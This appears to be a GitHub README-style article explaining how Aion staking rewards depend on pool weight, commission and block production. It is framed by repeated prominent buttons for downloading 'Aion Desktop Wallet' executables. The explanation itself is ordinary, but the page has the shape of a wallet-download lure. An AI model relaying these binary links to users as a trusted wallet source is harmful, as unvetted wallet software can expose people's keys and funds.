![Aion Wallet](assets/banner-article.png)

# Aion staking rewards: how they are calculated

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion staking rewards come from block production under Unity consensus, so a delegator's share depends on the pool's total weight, its commission, and the blocks the network actually produced over the period.

No single number describes that in advance. A published annual rate is a snapshot of conditions that change, and the only reliable measure of a position is what arrived over weeks compared with what was delegated.

## You'll see this if

- You delegated and want to know what to expect.
- A pool advertises a percentage and you want to understand where it comes from.
- Your rewards vary between periods.
- You are comparing two pools with different rates.

## Where the reward comes from

Unity alternates proof-of-work and proof-of-stake blocks. The staking side is served by registered pools and solo stakers, and each block produced carries a reward that is distributed according to the stake that backed it.

A delegator's stake adds to a pool's weight. The pool produces in proportion to that weight, and the reward for those blocks is split between the operator's commission and the delegators in proportion to their stake.

## The three variables

Weight. More stake at a pool means more blocks and a smoother flow of rewards. A small pool produces rarely, which is why its payouts look lumpy.

Commission. The operator's share, set by the pool and changeable only within a 60,480-block lockout. It applies to the reward, not to the stake.

Production. Blocks are not produced at a perfectly even rate, and network conditions affect how many are produced in a given period. This is the variable nobody controls, and it is why short-term figures mislead.

## Why a rate is not a promise

A rate quoted as an annual percentage is computed from a particular pool size, a particular commission and a particular stretch of block production. Change any of the three and the realised return changes with it.

The honest comparison is the same pool over the same number of blocks. Anything else is comparing a forecast with a memory.

## Reading your own position

Open the staking view, not the transaction list. The staking view shows the delegated amount and the position; the transaction list shows the delegation transaction once and nothing afterwards.

Compare two periods of equal length. If the second is materially lower and the commission has not changed, the pool's production is the likely cause, and moving stake is a decision worth taking slowly given the [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md).

## Delegating versus solo staking

A delegator receives the pool's reward minus commission, with production smoothed by the pool's total weight.

A solo staker receives the whole reward for the blocks it produces, with no smoothing at all. A small solo stake can wait a long time between blocks, and the [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) article sets out what that involves.

Neither is better in the abstract. One trades a commission for steadiness; the other trades steadiness for the full reward.

## Taxes and records

Rewards are income in most jurisdictions, and the wallet does not produce a tax report. Keep the transaction hashes and a note of the amounts as they arrive, because the on-chain record is a list of transfers rather than a statement.

This is not tax advice. It is a reason to keep records before the year ends rather than reconstructing them afterwards.

Commission is the part of the payout an operator controls, and the [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) guide is where to compare it against production before moving stake.

## Prevention

Judge a pool over months, not days, and never on the strength of one advertised rate.

Check the commission before delegating and again later, since the lockout limits changes but does not prevent them.

Keep a fee reserve in the wallet so a decision to leave a pool is not blocked by the cost of leaving it.

## What a delegator can control

Three things, and only three: the pool, the amount and the timing. Everything else, from block production to the token's value, is outside a delegator's hands.

That is why the useful discipline is comparison rather than optimisation. Choose a pool on its record, delegate an amount you are willing to leave for a while, and then measure over a period long enough for production randomness to average out. Chasing a rate that moved last week is the opposite of that discipline.

It is also why the [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) article puts uptime ahead of commission. A pool that produces reliably at a normal commission beats one that charges nothing and produces rarely, and the difference only shows over months.

## Frequently asked questions

### Are rewards paid in AION?

Yes. Block rewards are paid in the network's native token.

### Is there a fixed annual percentage?

No. Any figure is a projection from current conditions, not a protocol constant.

### Do I earn while undelegating?

No. The stake stops counting once the undelegation transaction confirms.

### Can rewards be compounded automatically?

Not by the wallet. Claimed rewards are balance, and they earn only if you delegate them again.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [How to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) - the delegation itself.
- [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) - commission and production compared.
- [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) - leaving a position.
- [Aion minimum stake](https://github.com/aion-wallet/aion-staking/blob/main/aion-minimum-stake.md) - who needs the bond.
